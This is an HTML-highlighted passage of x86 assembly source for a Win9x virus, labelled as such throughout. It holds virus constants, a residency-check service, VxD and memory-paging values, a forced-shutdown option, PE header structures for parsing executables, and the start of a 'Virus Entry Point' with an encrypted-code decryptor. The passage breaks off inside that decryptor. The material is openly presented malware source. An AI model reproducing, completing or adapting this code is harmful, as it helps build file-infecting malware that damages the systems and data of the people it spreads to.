    </span><span class="sc5">IMAGE_SIZEOF_NT_SIGNATURE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">         </span><span class="sc1">;PE00 = 0x00004550, 4 bytes</span><span class="sc0">
    </span><span class="sc5">NULL</span><span class="sc0">                        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">TRUE</span><span class="sc0">                        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">FALSE</span><span class="sc0">                       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;File Access</span><span class="sc0">
    </span><span class="sc5">GENERIC_READ</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80000000h</span><span class="sc0">   </span><span class="sc1">;Access Mode Read Only</span><span class="sc0">
    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">               </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40000000h</span><span class="sc0">   </span><span class="sc1">;Access Mode Write Only</span><span class="sc0">
    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">   </span><span class="sc1">;Open Share, Deny Write</span><span class="sc0">
    </span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000002h</span><span class="sc0">   </span><span class="sc1">;Open Share, Deny Read</span><span class="sc0">
    </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">ERROR_ALREADY_EXISTS</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000B7h</span><span class="sc0">
    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000080h</span><span class="sc0">
    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">               </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">;Fail if not found</span><span class="sc0">

</span><span class="sc1">;Shutdown Options</span><span class="sc0">
    </span><span class="sc5">EWX_FORCE</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">EWX_SHUTDOWN</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc1">;MessageBox</span><span class="sc0">
    </span><span class="sc5">MB_OK</span><span class="sc0">                       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc5">MB_YESNO</span><span class="sc0">                    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0">
    </span><span class="sc5">MB_ICONINFORMATION</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000040h</span><span class="sc0">

</span><span class="sc1">;Virus_Constants</span><span class="sc0">
    </span><span class="sc5">@BREAK</span><span class="sc0">                      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc1">;MAX_RUN_TIME               EQU     5*60*60*1000    ;Time we allow windows to run, 5hrs</span><span class="sc0">
    </span><span class="sc5">VIRUS_SIGNATURE</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">08121975h</span><span class="sc0">       </span><span class="sc1">;My B'day, 8 Dec 1975</span><span class="sc0">
    </span><span class="sc5">RESIDENCY_CHECK_SERVICE</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0AD75h</span><span class="sc0">          </span><span class="sc1">;Used to check if Virus is resident</span><span class="sc0">
    </span><span class="sc5">RESIDENCY_SUCCESS</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0812h</span><span class="sc0">           </span><span class="sc1">;Value returned if Virus is resident</span><span class="sc0">

</span><span class="sc1">;VxD Stuff</span><span class="sc0">
    </span><span class="sc5">VWIN32_Int21Dispatch</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">002A0010h</span><span class="sc0">
    </span><span class="sc5">LFN_OPEN_FILE_EXTENDED</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">716Ch</span><span class="sc0">
    </span><span class="sc5">PC_WRITEABLE</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00020000h</span><span class="sc0">
    </span><span class="sc5">PC_USER</span><span class="sc0">                     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00040000h</span><span class="sc0">
    </span><span class="sc5">PR_SHARED</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80060000h</span><span class="sc0">
    </span><span class="sc5">PC_PRESENT</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80000000h</span><span class="sc0">
    </span><span class="sc5">PC_FIXED</span><span class="sc0">                    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000008h</span><span class="sc0">
    </span><span class="sc5">PD_ZEROINIT</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">
    </span><span class="sc5">SHARED_MEMORY</span><span class="sc0">               </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80000000h</span><span class="sc0">   </span><span class="sc1">;Anything above this is shared</span><span class="sc0">
    </span><span class="sc5">PageReserve</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00010000h</span><span class="sc0">
    </span><span class="sc5">PageCommit</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00010001h</span><span class="sc0">
    </span><span class="sc5">PAGE_SIZE</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">4096</span><span class="sc0">        </span><span class="sc1">;Size of a Page in Win9x</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                            Structures                                  | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
    </span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">IMAGE_DOS_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                  </span><span class="sc1">;DOS .EXE header</span><span class="sc0">
    </span><span class="sc5">IDH_e_magic</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Magic number</span><span class="sc0">
    </span><span class="sc5">IDH_e_cblp</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Bytes on last page of file</span><span class="sc0">
    </span><span class="sc5">IDH_e_cp</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Pages in file</span><span class="sc0">
    </span><span class="sc5">IDH_e_crlc</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Relocations</span><span class="sc0">
    </span><span class="sc5">IDH_e_cparhdr</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Size of header in paragraphs</span><span class="sc0">
    </span><span class="sc5">IDH_e_minalloc</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Minimum extra paragraphs needed</span><span class="sc0">
    </span><span class="sc5">IDH_e_maxalloc</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Maximum extra paragraphs needed</span><span class="sc0">
    </span><span class="sc5">IDH_e_ss</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Initial (relative) SS value</span><span class="sc0">
    </span><span class="sc5">IDH_e_sp</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Initial SP value</span><span class="sc0">
    </span><span class="sc5">IDH_e_csum</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Checksum</span><span class="sc0">
    </span><span class="sc5">IDH_e_ip</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Initial IP value</span><span class="sc0">
    </span><span class="sc5">IDH_e_cs</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Initial (relative) CS value</span><span class="sc0">
    </span><span class="sc5">IDH_e_lfarlc</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;File address of relocation table</span><span class="sc0">
    </span><span class="sc5">IDH_e_ovno</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Overlay number</span><span class="sc0">
    </span><span class="sc5">IDH_e_res</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">;Reserved words</span><span class="sc0">
    </span><span class="sc5">IDH_e_oemid</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;OEM identifier (for IDH_e_oeminfo)</span><span class="sc0">
    </span><span class="sc5">IDH_e_oeminfo</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;OEM information; IDH_e_oemid specific</span><span class="sc0">
    </span><span class="sc5">IDH_e_res2</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;Reserved words</span><span class="sc0">
    </span><span class="sc5">IDH_e_lfanew</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;File address of new exe header</span><span class="sc0">
</span><span class="sc5">IMAGE_DOS_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
    </span><span class="sc5">IFH_Machine</span><span class="sc0">                 </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;System that the binary is intended to run on</span><span class="sc0">
    </span><span class="sc5">IFH_NumberOfSections</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Number of sections that follow headers</span><span class="sc0">
    </span><span class="sc5">IFH_TimeDateStamp</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Time/Date the file was created on</span><span class="sc0">
    </span><span class="sc5">IFH_PointerToSymbolTable</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Used for debugging information</span><span class="sc0">
    </span><span class="sc5">IFH_NumberOfSymbols</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Used for debugging information</span><span class="sc0">
    </span><span class="sc5">IFH_SizeOfOptionalHeader</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;sizof(IMAGE_OPTIONAL_HEADER)</span><span class="sc0">
    </span><span class="sc5">IFH_Characteristics</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Flags used mostly for libraries</span><span class="sc0">
</span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
    </span><span class="sc5">IDD_VirtualAddress</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">IDD_Size</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
    </span><span class="sc1">;Standard Fields</span><span class="sc0">
    </span><span class="sc5">IOH_Magic</span><span class="sc0">                           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Mostly 0x010B</span><span class="sc0">
    </span><span class="sc5">IOH_MajorLinkerVersion</span><span class="sc0">              </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Version of the linker used</span><span class="sc0">
    </span><span class="sc5">IOH_MinorLinkerVersion</span><span class="sc0">              </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Version of the linker used</span><span class="sc0">
    </span><span class="sc5">IOH_SizeOfCode</span><span class="sc0">                      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Size of executable code</span><span class="sc0">
    </span><span class="sc5">IOH_SizeOfInitializedData</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Size of Data Segment</span><span class="sc0">
    </span><span class="sc5">IOH_SizeOfUninitializedData</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Size of bss Segment</span><span class="sc0">
    </span><span class="sc5">IOH_AddressOfEntryPoint</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;RVA of code entry point</span><span class="sc0">
    </span><span class="sc5">IOH_BaseOfCode</span><span class="sc0">                      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Offset to executable code</span><span class="sc0">
    </span><span class="sc5">IOH_BaseOfData</span><span class="sc0">                      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Offset to initialized data</span><span class="sc0">
    </span><span class="sc1">;NT Additional Fields</span><span class="sc0">
    </span><span class="sc5">IOH_ImageBase</span><span class="sc0">                       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Preferred load address</span><span class="sc0">
    </span><span class="sc5">IOH_SectionAlignment</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Alignment of Sections in RAM</span><span class="sc0">
    </span><span class="sc5">IOH_FileAlignment</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Alignment of Sections in File</span><span class="sc0">
    </span><span class="sc5">IOH_MajorOperatingSystemVersion</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;OS Version required to run this image</span><span class="sc0">
    </span><span class="sc5">IOH_MinorOperatingSystemVersion</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;OS Version required to run this image</span><span class="sc0">
    </span><span class="sc5">IOH_MajorImageVersion</span><span class="sc0">               </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;User specified version number</span><span class="sc0">
    </span><span class="sc5">IOH_MinorImageVersion</span><span class="sc0">               </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;User specified version number</span><span class="sc0">
    </span><span class="sc5">IOH_MajorSubsystemVersion</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Expected Subsystem version</span><span class="sc0">
    </span><span class="sc5">IOH_MinorSubsystemVersion</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Expected Subsystem version</span><span class="sc0">
    </span><span class="sc5">IOH_Win32VersionValue</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Mostly set to 0</span><span class="sc0">
    </span><span class="sc5">IOH_SizeOfImage</span><span class="sc0">                     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Amount of memory the image will need</span><span class="sc0">
    </span><span class="sc5">IOH_SizeOfHeaders</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Size of DOS hdr, PE hdr and Object table</span><span class="sc0">
    </span><span class="sc5">IOH_CheckSum</span><span class="sc0">                        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Checksum (Used by NT to check drivers)</span><span class="sc0">
    </span><span class="sc5">IOH_Subsystem</span><span class="sc0">                       </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Subsystem required to run this image</span><span class="sc0">
    </span><span class="sc5">IOH_DllCharacteristics</span><span class="sc0">              </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;To decide when to call DLL's entry point</span><span class="sc0">
    </span><span class="sc5">IOH_SizeOfStackReserve</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Size of Reserved Stack</span><span class="sc0">
    </span><span class="sc5">IOH_SizeOfStackCommit</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Size of initially commited stack</span><span class="sc0">
    </span><span class="sc5">IOH_SizeOfHeapReserve</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Size of local heap to reserve</span><span class="sc0">
    </span><span class="sc5">IOH_SizeOfHeapCommit</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Amount to commit in local heap</span><span class="sc0">
    </span><span class="sc5">IOH_LoaderFlags</span><span class="sc0">                     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Not generally used</span><span class="sc0">
    </span><span class="sc5">IOH_NumberOfRvaAndSizes</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Number of valid entries in DataDirectory</span><span class="sc0">
    </span><span class="sc5">IOH_DataDirectory</span><span class="sc0">                   </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">IMAGE_EXPORT_DIRECTORY</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
    </span><span class="sc5">IED_Characteristics</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Currently set to 0</span><span class="sc0">
    </span><span class="sc5">IED_TimeDateStamp</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Time/Date the export data was created</span><span class="sc0">
    </span><span class="sc5">IED_MajorVersion</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;User settable</span><span class="sc0">
    </span><span class="sc5">IED_MinorVersion</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">IED_Name</span><span class="sc0">                    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;RVA of DLL ASCIIZ name</span><span class="sc0">
    </span><span class="sc5">IED_Base</span><span class="sc0">                    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;First valid exported ordinal</span><span class="sc0">
    </span><span class="sc5">IED_NumberOfFunctions</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Number of entries</span><span class="sc0">
    </span><span class="sc5">IED_NumberOfNames</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Number of entries exported by name</span><span class="sc0">
    </span><span class="sc5">IED_AddressOfFunctions</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;RVA of export address table</span><span class="sc0">
    </span><span class="sc5">IED_AddressOfNames</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;RVA of export name table pointers</span><span class="sc0">
    </span><span class="sc5">IED_AddressOfNameOrdinals</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;RVA of export ordinals table entry</span><span class="sc0">
</span><span class="sc5">IMAGE_EXPORT_DIRECTORY</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
    </span><span class="sc5">ISH_Name</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">;NULL padded ASCII string</span><span class="sc0">
    </span><span class="sc9">UNION</span><span class="sc0">
        </span><span class="sc5">ISH_PhysicalAddress</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">ISH_VirtualSize</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Size that will be allocated when obj is loaded</span><span class="sc0">
    </span><span class="sc9">ENDS</span><span class="sc0">
    </span><span class="sc5">ISH_VirtualAddress</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;RVA to section's data when loaded in RAM</span><span class="sc0">
    </span><span class="sc5">ISH_SizeOfRawData</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Size of sections data rounded to FileAlignment</span><span class="sc0">
    </span><span class="sc5">ISH_PointerToRawData</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Offset from files beginning to sections data</span><span class="sc0">
    </span><span class="sc5">ISH_PointerToRelocations</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ISH_PointerToLinenumbers</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ISH_NumberOfRelocations</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ISH_NumberOfLinenumbers</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ISH_Characteristics</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;Flags to decide how section should be treated</span><span class="sc0">
</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
    </span><span class="sc5">ST_wYear</span><span class="sc0">                    </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ST_wMonth</span><span class="sc0">                   </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ST_wDayOfWeek</span><span class="sc0">               </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ST_wDay</span><span class="sc0">                     </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ST_wHour</span><span class="sc0">                    </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ST_wMinute</span><span class="sc0">                  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ST_wSecond</span><span class="sc0">                  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ST_wMilliseconds</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                         Virus Entry Point                              | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc1">;Decryptor</span><span class="sc0">
</span><span class="sc5">StartOfVirusCode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
</span><span class="sc5">GetDelta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">5Eh</span><span class="sc0">                             </span><span class="sc1">;pop    esi</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc0">                             </span><span class="sc1">;add    esi, EncryptedVirusCode - GetDelta</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0C6h</span><span class="sc0">
